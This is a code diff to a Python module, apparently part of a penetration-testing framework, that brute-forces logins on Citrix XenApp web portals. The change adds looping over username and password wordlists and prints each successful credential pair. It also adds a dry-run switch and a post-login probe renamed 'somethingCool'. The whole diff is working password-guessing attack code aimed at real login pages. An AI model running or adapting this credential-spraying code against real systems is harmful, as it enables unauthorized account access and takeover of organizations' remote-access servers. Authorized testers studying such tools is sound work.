@@ -13,7 +13,7 @@ class citrixBrute2010(webModule):
         self.fingerprint="20[1,0][4,8,0,9] Citrix"
         self.response="Success"
     ignore = ['Settings','Log Off', 'Messages']
-    def appDetect(self, config, c, cookies2, cpost):
+    def somethingCool(self, config, c, cookies2, cpost):
        resp3 = c.get(config["HOST"] + '/Citrix/XenApp/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False)
        m = re.search('There are no resources currently available for this user.', resp3.text)
        if m:
@@ -32,7 +32,9 @@ class citrixBrute2010(webModule):
             m = re.search('default.aspx', cpost.text)
             if m:
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
-                self.appDetect(config, c, cookies2, cpost)
+                if not config["dry_run"]:
+                    print("[!] Time to do something cool!")
+                    self.somethingCool(config, c, cookies2, cpost)
             else:
                 print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
     def payload(self, config):
@@ -47,16 +49,38 @@ class citrixBrute2010(webModule):
             cookies2['WIUser'] = "CTX_ForcedClient#Off~CTX_LaunchMethod#Ica-Local"
             cget = c.get(config["HOST"] + '/Citrix/XenApp/auth/login.aspx', allow_redirects=False, verify=False)
             #print cget.text
-            if config["UserFile"]:
-                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-                    for line in lines:
-                        config["USERNAME"] = line.strip('\n')
+            if config["PASS_FILE"]:
+                pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
+                for pass_line in pass_lines:
+                    if config["UserFile"]:
+                        lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                        for line in lines:
+                            config["USERNAME"] = line.strip('\n')
+                            config["PASSWORD"] = pass_line.strip('\n')
+                            payload = {
+                                'LoginType': 'Explicit',
+                                'user': config["USERNAME"],
+                                'password': config["PASSWORD"]
+                                }
+                            self.connectTest(config, payload, cookies2)
+                    else:
+                        config["PASSWORD"] = pass_line.strip('\n')
                         payload = {
                             'LoginType': 'Explicit',
                             'user': config["USERNAME"],
                             'password': config["PASSWORD"]
                             }
                         self.connectTest(config, payload, cookies2)
+            elif config["UserFile"]:
+                lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                for line in lines:
+                    config["USERNAME"] = line.strip('\n')
+                    payload = {
+                        'LoginType': 'Explicit',
+                        'user': config["USERNAME"],
+                        'password': config["PASSWORD"]
+                        }
+                    self.connectTest(config, payload, cookies2)
             else:
                 payload = {
                     'LoginType': 'Explicit',
